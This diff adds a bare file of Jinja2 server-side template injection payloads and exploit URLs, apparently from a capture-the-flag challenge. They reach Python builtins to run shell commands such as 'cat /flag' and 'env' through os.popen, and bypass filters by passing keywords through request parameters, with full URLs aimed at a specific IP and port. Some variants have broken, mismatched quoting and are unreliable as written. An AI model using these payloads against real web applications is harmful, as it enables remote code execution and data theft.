@@ -1,0 +1,11 @@
+{% print %0a (lipsum["__globals__"])["__getitem__"]("__builtins__")["__getitem__"]("eval")("__import__('os').popen('cat /flag').read()") %}
+
+request["args"]["b"]
+
+{% print %0a (lipsum["request["args"]["a"]"])["request["args"]["b"]"]("request["args"]["c"]")["request["args"]["d"]"]("eval")("request["args"]["h"]('os').request["args"]["f"]("env").read()") %}&a=__globals__&b=__getitem__&c=__builtins__&d=__getitem__&e=__globals__&f=popen&g=read&h=__import__&i=flag
+
+
+http://8.130.75.113:25475/greetings?name={%%20print%20%0a%20(lipsum[%22request[%22args%22][%22a%22]%22])[%22request[%22args%22][%22b%22]%22](%22request[%22args%22][%22c%22]%22)[%22request[%22args%22][%22d%22]%22](%22eval%22)(%22request[%22args%22][%22h%22](%27os%27)[%22request[%22args%22][%22f%22]](%27cat%20/request[%22args%22][%22i%27]%22)[%22request[%22args%22][%22g%22]%22]()%22)%20%}&a=__globals__&b=__getitem__&c=__builtins__&d=__getitem__&e=__globals__&f=popen&g=read&h=__import__&i=flag
+
+http://8.130.75.113:25475/greetings?name=%7b%25print(%22%22%5brequest%5b%22args%22%5d%5b%22a%22%5d%5d%5brequest%5b%22args%22%5d%5b%22b%22%5d%5d%5b0%5d%5brequest%5b%22args%22%5d%5b%22c%22%5d%5d()%5b133%5d%5brequest%5b%22args%22%5d%5b%22d%22%5d%5d%5brequest%5b%22args%22%5d%5b%22e%22%5d%5d%5brequest%5b%22args%22%5d%5b%22f%22%5d%5d(request%5b%22args%22%5d%5b%22aa%22%5d)%5brequest%5b%22args%22%5d%5b%22g%22%5d%5d())%25%7d&a=__class__&b=__bases__&c=__subclasses__&d=__init__&e=__globals__&f=popen&g=read&aa=env%20-lha%20%2f
+
